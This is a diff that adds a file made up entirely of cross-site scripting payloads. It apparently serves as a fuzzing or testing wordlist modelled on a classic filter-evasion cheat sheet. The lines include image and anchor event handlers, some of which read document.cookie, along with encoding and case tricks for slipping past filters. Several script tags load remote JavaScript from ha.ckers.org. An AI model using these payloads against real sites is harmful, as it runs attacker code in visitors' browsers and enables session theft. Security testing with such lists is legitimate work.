@@ -1,0 +1,23 @@
+>'>"><img src=x onerror=alert(0)>
+<IMG SRC="javascript:alert('XSS');">
+<IMG onmouseover="alert('xxs')">
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<a onmouseover="alert(document.cookie)">xxs link<a>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC="/x" onerror="jav      ascript:alert('XSS');">
+<IMG SRC="/" onerror="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="/x" onerror="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="/x" onerror="jav%00ascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>%
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
